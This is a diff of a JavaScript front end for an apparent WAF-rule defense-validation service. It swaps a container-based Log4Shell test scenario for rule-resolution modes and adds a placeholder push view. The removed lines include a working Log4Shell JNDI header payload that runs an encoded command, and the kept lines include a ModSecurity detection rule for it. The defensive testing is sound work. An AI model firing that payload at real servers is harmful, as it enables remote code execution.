@@ -1,19 +1,12 @@
 "use strict";
 
-// Default mitigation scenario with the actual log4j artifacts inlined.
-const SCENARIO = {
+// Two starting payloads. Inline carries the rule itself; upstream names a verified
+// producer row and the service resolves the rule from it.
+const INLINE_PAYLOAD = {
   contract_id: "defense-validation@1.0",
   candidate_artifact_id: "candidate:log4shell:waf-rule:1",
   test_basis_id: "test-basis:log4shell:true-positive:1",
   check_profile_id: "defense-validation-profile:waf-http:1",
-  substrate_selector: "substrate:log4j-vulnerable-webserver:container",
-  substrate: {
-    kind: "container-image",
-    port: 8080,
-    image: "artifact.it.att.com/apm0047460-dkr-stage/log4shell-vulnerable-app:latest",
-    digest: "sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929",
-    vulnerability_id: "CVE-2021-44228",
-  },
   candidate: {
     kind: "waf-rule",
     engine: "modsecurity",
@@ -25,19 +18,32 @@ const SCENARIO = {
       '"id:1005440,phase:2,deny,status:403,t:none,t:urlDecodeUni,' +
       "log,msg:'Log4Shell JNDI lookup attempt (CVE-2021-44228)',tag:'CVE-2021-44228\"",
   },
-  test_basis: {
-    kind: "http-request-attack",
-    proof_basis: "verified-vuln-artifact",
-    request: {
-      method: "GET",
-      path: "/",
-      headers: {
-        "X-Api-Version":
-          "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}",
+};
+
+const UPSTREAM_PAYLOAD = {
+  contract_id: "defense-validation@1.0",
+  candidate_artifact_id: "candidate:akamai-waf:e6fcf665",
+  test_basis_id: "unused-in-this-mode",
+  check_profile_id: "defense-validation-profile:waf-http:1",
+  upstream_inputs: [
+    {
+      capability: "control-translation",
+      contract_id: "control-translation-result@2.0",
+      result_id: "control-translation-result:e0b7e5cf-24ce-4c2b-9112-afc3006576de",
+      result_ref: {
+        system: "databricks",
+        catalog: "36889_janus_dev",
+        schema: "control_translation",
+        table: "control_translation_results",
+        key: "control-translation-result:e0b7e5cf-24ce-4c2b-9112-afc3006576de",
       },
     },
-    expected: { classification: "true-positive", blocked: true, status_code: 403 },
-  },
+  ],
+};
+
+const INPUT_NOTES = {
+  inline: "The rule travels in the request. No producer lineage, so nothing is hash-verified against an upstream result.",
+  upstream: "The rule is read from the named Databricks row and verified against its content_hash before being reported.",
 };
 
 const form = document.getElementById("run-form");
@@ -48,33 +54,24 @@ const statusEl = document.getElementById("composer-status");
 const runListEl = document.getElementById("run-list");
 const detailEl = document.getElementById("detail");
 const composerEl = document.getElementById("composer");
-const execToggle = document.getElementById("exec-toggle");
-const execNote = document.getElementById("exec-note");
+const inputToggle = document.getElementById("input-toggle");
+const inputNote = document.getElementById("input-note");
 
 let selectedRunId = null;
-let execMode = "local";
+let inputMode = "inline";
 
-const EXEC_NOTES = {
-  local: "Runs the substrate on the host Docker daemon.",
-  inmemory: "Runs entirely inside the API — an in-process stand-in target, no Docker/cloud. Fast and portable; validates rule logic, not the real vulnerable image.",
-  firewall: "In-memory L3/L4 firewall-rule evaluation (no substrate). Expects a firewall-rule candidate + a network-connection test — see scenarios/05-06.",
-  aci: "Runs the substrate as an Azure Container Instance via DefaultAzureCredential (managed identity on ACA; needs Azure config).",
-  "aci-sp": "Azure Container Instance authenticated with a service principal (AZURE_TENANT_ID/CLIENT_ID/CLIENT_SECRET) — works from a laptop or ACA.",
-  github: "Dispatches a GitHub Actions workflow that runs the scenario, then stores the retrieved result (needs GitHub config).",
-  "github-ghcr": "Like GitHub Actions, but the API first relays the substrate image into the repo's GHCR (and sets a runner pull secret) so the runner needs no access to the source registry.",
-};
-
-execToggle.addEventListener("click", (e) => {
+inputToggle.addEventListener("click", (e) => {
   const btn = e.target.closest(".toggle-opt");
   if (!btn) return;
-  execMode = btn.dataset.mode;
-  execToggle.querySelectorAll(".toggle-opt").forEach((b) =>
+  inputMode = btn.dataset.mode;
+  inputToggle.querySelectorAll(".toggle-opt").forEach((b) =>
     b.classList.toggle("active", b === btn)
   );
-  execNote.textContent = EXEC_NOTES[execMode] || "";
+  inputNote.textContent = INPUT_NOTES[inputMode] || "";
+  payloadEl.value = JSON.stringify(
+    inputMode === "inline" ? INLINE_PAYLOAD : UPSTREAM_PAYLOAD, null, 2);
 });
 
-// Landing view: only the submit composer is shown.
 function showLanding() {
   selectedRunId = null;
   detailEl.hidden = true;
@@ -82,7 +79,6 @@ function showLanding() {
   loadRuns();
 }
 
-// Detail view: only the request + response are shown (no submit option).
 function showDetail() {
   composerEl.hidden = true;
   detailEl.hidden = false;
@@ -93,10 +89,11 @@ const esc = (s) =>
 
 const apiBase = () => (apiBaseInput.value || "").trim().replace(/\/+$/, "");
 
+// A resolved rule is a success; anything else is not. None of these are verdicts
+// about the rule — only about whether it could be read.
 const STATE_CLASS = {
-  blocked: "ok",
-  "not-blocked": "warn",
-  "could-not-test": "warn",
+  "rule-resolved": "ok",
+  failed: "err",
   malfunction: "err",
 };
 
@@ -125,13 +122,11 @@ async function loadRuns() {
       const cls = STATE_CLASS[r.terminal_state] || "warn";
       const active = r.run_id === selectedRunId ? " active" : "";
       const time = new Date(r.created_at).toLocaleTimeString();
-      const mark = r.match ? "✓" : "✗";
       return `
         <li class="run-item${active}" data-run="${esc(r.run_id)}">
           <div class="run-top">
             <span class="dot dot-${cls}"></span>
             <span class="run-state">${esc(r.terminal_state)}</span>
-            <span class="run-match run-match-${r.match ? "ok" : "no"}">${mark}</span>
           </div>
           <div class="run-id">${esc(r.run_id)}</div>
           <div class="run-time">${esc(time)}</div>
@@ -148,12 +143,12 @@ runListEl.addEventListener("click", (e) => {
 document.getElementById("refresh-btn").addEventListener("click", loadRuns);
 document.getElementById("new-btn").addEventListener("click", showLanding);
 
-// ---- Run detail: immutable request + response ----
+// ---- Run detail: immutable request + the resolved rule ----
 
 async function selectRun(runId) {
   selectedRunId = runId;
   showDetail();
-  loadRuns(); // refresh active highlight
+  loadRuns();
   detailEl.innerHTML = `<p class="detail-empty">Loading ${esc(runId)}…</p>`;
   let rec;
   try {
@@ -184,51 +179,80 @@ function renderDetail(rec) {
   detailEl.insertAdjacentHTML("beforeend", `
     <pre class="code">${esc(JSON.stringify(rec.request, null, 2))}</pre>
 
-    <h3>Result</h3>
-    ${outcomeHTML(o)}`);
+    <h3>Resolved rule</h3>
+    ${outcomeHTML(o)}
+
+    <h3>Push to control plane</h3>
+    ${pushHTML(o)}`);
+}
+
+// prettyRule renders a rule body: JSON rule sets are re-indented, and any other
+// syntax (a ModSecurity SecRule, for instance) is shown as written.
+function prettyRule(rule) {
+  if (!rule) return "";
+  try {
+    return JSON.stringify(JSON.parse(rule), null, 2);
+  } catch (err) {
+    return rule;
+  }
 }
 
 function outcomeHTML(o) {
   if (!o || !o.terminal_state) return `<div class="response idle">No result.</div>`;
   const cls = STATE_CLASS[o.terminal_state] || "warn";
-  const matchBadge = o.match
-    ? '<span class="pill pill-ok">✓ actual matches expected</span>'
-    : '<span class="pill pill-err">✗ actual ≠ expected</span>';
-
-  const row = (label, exp, act) => `
-    <tr><th>${esc(label)}</th><td>${esc(exp)}</td>
-    <td class="${exp === act ? "" : "diff"}">${esc(act)}</td></tr>`;
-
-  const exp = o.expected || {};
-  const act = o.actual || {};
-  const sub = o.substrate || {};
+  const cand = o.candidate || {};
   const steps = (o.steps || []).map((s) => `<li>${esc(s)}</li>`).join("");
+  const limits = (o.limitations || []).map((s) => `<li>${esc(s)}</li>`).join("");
+
+  const rule = cand.rule
+    ? `<pre class="code rule">${esc(prettyRule(cand.rule))}</pre>`
+    : `<p class="detail-line">No rule on this result — see the detail below.</p>`;
 
   return `
     <div class="response ${cls}">
-      <div class="verdict"><span class="state">${esc(o.terminal_state)}</span>${matchBadge}</div>
+      <div class="verdict"><span class="state">${esc(o.terminal_state)}</span></div>
       <p class="summary">${esc(o.prose_summary || "")}</p>
       <table class="cmp">
-        <thead><tr><th></th><th>expected</th><th>actual</th></tr></thead>
         <tbody>
-          ${row("blocked", exp.blocked, act.blocked)}
-          ${row("status_code", exp.status_code, act.status_code)}
-          ${row("reached app", false, act.reached_app)}
-          ${act.matched_rule_id ? `<tr><th>matched rule</th><td>—</td><td>${esc(act.matched_rule_id)}</td></tr>` : ""}
+          <tr><th>kind</th><td>${esc(cand.kind || "—")}</td></tr>
+          <tr><th>engine</th><td>${esc(cand.engine || "—")}</td></tr>
+          <tr><th>rule id</th><td>${esc(cand.rule_id || "—")}</td></tr>
+          <tr><th>action</th><td>${esc(cand.action || "—")}</td></tr>
         </tbody>
       </table>
-      <p class="detail-line">${esc(act.detail || "")}</p>
-      <div class="substrate">substrate: ${esc(sub.image || "?")}${
-        sub.runner ? " · runner " + esc(sub.runner) : ""
-      }${sub.container_id ? " · " + esc(sub.container_id) : ""}${
-        sub.fqdn ? " · " + esc(sub.fqdn) : ""
-      }${sub.host_port ? " · :" + esc(sub.host_port) : ""} · ready=${!!sub.ready}</div>
-      <details><summary>execution steps</summary><ol>${steps}</ol></details>
-      <details open><summary>full response JSON</summary><pre class="json-dump">${esc(JSON.stringify(o, null, 2))}</pre></details>
+      ${rule}
+      <p class="detail-line">${esc(o.detail || "")}</p>
+      ${limits ? `<details open><summary>limitations</summary><ul>${limits}</ul></details>` : ""}
+      <details><summary>resolution steps</summary><ol>${steps}</ol></details>
+      <details><summary>full response JSON</summary><pre class="json-dump">${esc(JSON.stringify(o, null, 2))}</pre></details>
     </div>`;
 }
 
-// ---- Submit a new run ----
+// pushHTML is the placeholder for the third-party push stage. It reports what the
+// rule would be pushed as, and states plainly that no push has happened.
+function pushHTML(o) {
+  const cand = (o && o.candidate) || {};
+  if (!cand.rule) {
+    return `<div class="response idle">Nothing to push: no rule was resolved.</div>`;
+  }
+  return `
+    <div class="response idle">
+      <p class="summary">Not pushed. No control-plane integration is wired up yet.</p>
+      <table class="cmp">
+        <tbody>
+          <tr><th>target engine</th><td>${esc(cand.engine || "—")}</td></tr>
+          <tr><th>control class</th><td>${esc(cand.kind || "—")}</td></tr>
+          <tr><th>requested action</th><td>${esc(cand.action || "—")}</td></tr>
+        </tbody>
+      </table>
+      <p class="detail-line">
+        Whether this rule actually blocks anything is decided by the control plane
+        it is pushed to, not by this service.
+      </p>
+    </div>`;
+}
+
+// ---- Submit ----
 
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
@@ -239,13 +263,11 @@ form.addEventListener("submit", async (e) => {
     setStatus("err", "Payload is not valid JSON: " + err.message);
     return;
   }
-  // The toggle is authoritative for where the substrate runs.
-  payload.execution_mode = execMode;
 
   const url = apiBase() + "/v1/compat/defense-validation-runs";
   submitBtn.disabled = true;
-  submitBtn.textContent = "Running scenario…";
-  setStatus("idle", "Bringing up the container, applying the WAF rule, running the test… (~20–40s)");
+  submitBtn.textContent = "Resolving…";
+  setStatus("idle", "Resolving the rule…");
 
   try {
     const res = await fetch(url, {
@@ -255,7 +277,8 @@ form.addEventListener("submit", async (e) => {
     });
     const body = await res.json();
     if (res.ok && body.terminal_state) {
-      setStatus("ok", "Run complete: " + body.terminal_state + (body.match ? " (matches expected)" : " (differs from expected)"));
+      setStatus(body.terminal_state === "rule-resolved" ? "ok" : "err",
+        "Run complete: " + body.terminal_state);
       await loadRuns();
       selectRun(body.run_id);
     } else {
@@ -265,7 +288,7 @@ form.addEventListener("submit", async (e) => {
     setStatus("err", "Request failed: " + err.message + "\nIs the API running at " + apiBase() + "?");
   } finally {
     submitBtn.disabled = false;
-    submitBtn.textContent = "Submit run · POST";
+    submitBtn.textContent = "Resolve rule · POST";
   }
 });
 
@@ -273,5 +296,6 @@ form.addEventListener("submit", async (e) => {
 // API endpoint comes from the runtime-injected env (window.DV_API_BASE), falling
 // back to localhost for local dev. The field stays editable for manual override.
 apiBaseInput.value = (window.DV_API_BASE || "http://localhost:8137").trim();
-payloadEl.value = JSON.stringify(SCENARIO, null, 2);
+payloadEl.value = JSON.stringify(INLINE_PAYLOAD, null, 2);
+inputNote.textContent = INPUT_NOTES.inline;
 loadRuns();
